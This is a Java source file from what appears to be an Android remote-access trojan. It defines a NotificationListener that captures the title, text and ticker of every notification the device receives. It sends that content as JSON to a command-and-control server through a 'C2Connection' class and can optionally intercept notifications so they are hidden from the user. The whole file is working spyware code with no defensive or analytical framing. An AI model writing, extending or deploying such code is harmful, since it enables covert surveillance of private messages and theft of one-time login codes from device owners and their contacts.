package com.tarjon.admin.utils;

import android.app.Notification;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Manages notification monitoring and interception
 */
public class NotificationListener {
    private static final String TAG = "NotificationListener";
    
    private final Context context;
    private final C2Connection c2Connection;
    
    // Flag for notification interception
    private boolean interceptNotifications = false;
    
    public NotificationListener(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
    }
    
    /**
     * Process an accessibility event to check for notifications
     * @param event Accessibility event
     */
    public void processNotification(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            return;
        }
        
        // Get the notification parcelable
        Notification notification = (Notification) event.getParcelableData();
        if (notification == null) {
            return;
        }
        
        // Get notification details
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        CharSequence tickerText = notification.tickerText;
        
        // Extract more details from extras
        String title = "";
        String text = "";
        
        if (notification.extras != null) {
            title = notification.extras.getString(Notification.EXTRA_TITLE, "");
            CharSequence textSequence = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            text = textSequence != null ? textSequence.toString() : "";
        }
        
        // Get app name
        String appName = getAppNameFromPackage(packageName);
        
        // Log the notification
        logNotification(packageName, appName, title, text, tickerText);
    }
    
    /**
     * Process a status bar notification
     * @param sbn Status bar notification
     * @return true if notification was intercepted
     */
    public boolean processStatusBarNotification(StatusBarNotification sbn) {
        if (sbn == null) {
            return false;
        }
        
        // Get notification details
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        
        if (notification == null) {
            return false;
        }
        
        // Extract details from notification
        String title = "";
        String text = "";
        
        if (notification.extras != null) {
            title = notification.extras.getString(Notification.EXTRA_TITLE, "");
            CharSequence textSequence = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            text = textSequence != null ? textSequence.toString() : "";
        }
        
        // Get app name
        String appName = getAppNameFromPackage(packageName);
        
        // Log the notification
        logNotification(packageName, appName, title, text, notification.tickerText);
        
        // Return whether to intercept
        return interceptNotifications;
    }
    
    /**
     * Set notification interception flag
     * @param intercept Whether to intercept notifications
     */
    public void setInterceptNotifications(boolean intercept) {
        this.interceptNotifications = intercept;
    }
    
    /**
     * Log a notification to the C2 server
     */
    private void logNotification(String packageName, String appName, String title, 
                                String text, CharSequence tickerText) {
        try {
            JSONObject notificationData = new JSONObject();
            notificationData.put("packageName", packageName);
            notificationData.put("appName", appName);
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("ticker", tickerText != null ? tickerText.toString() : "");
            notificationData.put("timestamp", System.currentTimeMillis());
            notificationData.put("intercepted", interceptNotifications);
            
            c2Connection.sendCommandResult("notification", 
                    appName + ": " + (title.isEmpty() ? "Notification" : title), 
                    notificationData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification JSON: " + e.getMessage());
        }
    }
    
    /**
     * Get app name from package name
     */
    private String getAppNameFromPackage(String packageName) {
        PackageManager pm = context.getPackageManager();
        try {
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }
}